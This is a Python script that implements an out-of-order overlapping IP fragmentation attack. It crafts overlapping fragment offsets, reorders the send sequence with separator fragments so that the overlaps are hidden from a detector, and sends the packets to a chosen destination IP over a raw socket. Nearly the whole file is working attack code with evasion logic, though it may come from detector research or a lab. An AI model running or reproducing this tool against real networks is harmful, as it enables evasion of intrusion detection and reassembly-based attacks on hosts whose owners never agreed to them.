#Out-of-Order(O-of-O) Overlapping Fragments Attack

#Import Libraries:
import socket
import random
import sys
from math import ceil

#Import Functions:
from helper_functs.attackParamClass import attackParamClass
from helper_functs.rawsocket import rawSockGen
from helper_functs.ipFormCheck import ipFormCheck
from helper_functs.ipHeadFieldGen import ipHeadFieldGen

def OofOoverlapAttackParam(srcIP, dstIP):

    #Check if IP address have correct form:
    isSrcIpValid=ipFormCheck(srcIP)
    isDestIpValid=ipFormCheck(dstIP)

    if (isSrcIpValid==False)or(isDestIpValid==False):
        if (isSrcIpValid==False)and(isDestIpValid==False):
            print("Error: Both Source and Destination IP addresses have the wrong form. Please enter them and try again!") 
        elif (isSrcIpValid==False):
           print("Error: Source IP address has the wrong form. Please enter it and try again!") 
        else:
            print("Error: Destination IP address has the wrong form. Please enter it and try again!")

        sys.exit(1) 

    #Define paramters to default/design choice values (same as we did in the Simple Overlap Attack)
    TTL=64 
    IDField=random.randint(0, 65535)
    protoField=socket.IPPROTO_UDP 
    fragSize=32

    numOverlaps=random.randint(4,6)#Define how many overlaps occur (design choice):

    #Define a random amount of fragment packets to send:
    totalNumFragsMin=numOverlaps*3
    totalNumFragsMax=totalNumFragsMin+20
    totalNumFrags=random.randint(totalNumFragsMin,totalNumFragsMax)

    candInds=list(range(1,totalNumFrags)) #list every possible fragment index that except the very first (index 0 has no "previous" fragment to overlap)
    random.shuffle(candInds) #shuffle (so overlap positions are not always biased toward the smaller indices)

    overlapInds=[]

    for i in range(len(candInds)):
        candInd=candInds[i]

        #Check that this candidate sits (at least) 2 indices away from every index already chosen:
        isFarEnough=True
        for j in range(len(overlapInds)):
            chosen=overlapInds[j]
            if (abs(candInd-chosen)<2):#this ensures our attack is not broken (e.g. two overlapping fragments ending up next to each other; will be detected)
                isFarEnough=False

        if (isFarEnough==True):
            overlapInds.append(candInd)

        if (len(overlapInds)==numOverlaps): #stop once we have as many overlap indices as we need
            break

    overlapInds.sort() #for easier search later

    if (len(overlapInds)<numOverlaps): #flag if we didn't find enough overlapping indices (due to spacing constraints; i.e. high 'numOverlaps' and low 'totalNumFrags')
        print(f"Warning: only found {len(overlapInds)} valid overlap indices out of {numOverlaps} requested.")


    allFragms=[] #Stores all generated fragments

    #Offset Counter:
    currOffset=0

    for i in range(totalNumFrags):
        if (i in overlapInds):#Overlapping fragments

            #Same logic as before: we randomly select a offset for fragment (8-bytes) and its size.
            overlapOffset=random.randrange(8,fragSize-8+1,8) 
            maxOverlapSize=fragSize-overlapOffset 

            overlapSize=random.randint(4,maxOverlapSize)

            overlapFragOffset=allFragms[i-1]["fragOffset"]+overlapOffset 
            overlapFragSize=overlapSize+maxOverlapSize

            if (i != (totalNumFrags-1)): #also same 
                overlapFragSize=ceil(overlapFragSize/8)*8 

        else: #Otherwise normal fragment 
            overlapFragOffset=currOffset
            overlapFragSize=fragSize

        #(also like before)
        currOffset=overlapFragOffset+overlapFragSize 
        fragPayload=bytes([i+65])*overlapFragSize 

        #Save all fragments (their size, starting offset, and payload):
        allFragms.append({
        "fragSize":overlapFragSize,
        "fragOffset":overlapFragOffset, 
        "fragPayload":fragPayload
        })

    return attackParamClass(srcIP,dstIP,IDField,TTL,protoField,fragSize,allFragms),overlapInds


def OofOoverlapAttack(attackParams,overlapInds):
    rawSock=rawSockGen()

    numFrags=len(attackParams.allFragms)

    #Build reserved indices (both halves of every overlap pair):
    reservedInds=[]
    for i in range(len(overlapInds)):
        overlapInd=overlapInds[i]
        reservedInds.append(overlapInd-1)
        reservedInds.append(overlapInd)

    sendOrderList=list(range(numFrags))#starts as normal build order
    usedSeperatorInds=[]
    for i in range(0,len(reservedInds),2):
        partnerInd=reservedInds[i]
        overlapInd=reservedInds[i+1]

        freeInds=[]#find free indices (not already used as a separator)
        for j in range(numFrags):
            isreservedInds=False
            isusedSeperatorInds=False

            for k in range(len(reservedInds)):
                if (j==reservedInds[k]):
                    isreservedInds=True

            for t in range(len(usedSeperatorInds)):
                if (j==usedSeperatorInds[t]):
                    isusedSeperatorInds=True

            if (isreservedInds==False and isusedSeperatorInds==False):
                freeInds.append(j)

        if (len(freeInds)==0): 
            print(f"Warning: no separator available for overlap pair ({partnerInd},{overlapInd}); this pair will NOT be hidden from V1.")
            continue

        separator=freeInds[0]
        usedSeperatorInds.append(separator)

        #Move separator to right after partner:
        sendOrderList.remove(separator)
        insertAtInd=sendOrderList.index(partnerInd)+1
        sendOrderList.insert(insertAtInd,separator)

    for i in range(len(sendOrderList)):
        Ind=sendOrderList[i]#real fragment index
        frag=attackParams.allFragms[Ind]

        if (Ind==(numFrags-1)): #true last fragment
            isLastFrag=True
        else:
            isLastFrag=False

        ipHeadPacket=ipHeadFieldGen(attackParams.srcIPAddr,attackParams.destIPAddr,attackParams.IDField,attackParams.TTL,attackParams.protoField,frag["fragSize"],frag["fragOffset"],isLastFrag)

        ipPacket=ipHeadPacket + frag["fragPayload"]
        rawSock.sendto(ipPacket, (attackParams.destIPAddr,0))

        if (i in overlapInds):
            print(f"[Frag {i+1}] size={frag['fragSize']}, offset={frag['fragOffset']}, MF={0 if isLastFrag else 1} ---> Overlapping Fragment")
        else:
            print(f"[Frag {i+1}] size={frag['fragSize']}, offset={frag['fragOffset']}, MF={0 if isLastFrag else 1}")

    print(f"\n=> Fragments sent out of order with ID={attackParams.IDField}. Attack Completed!")

    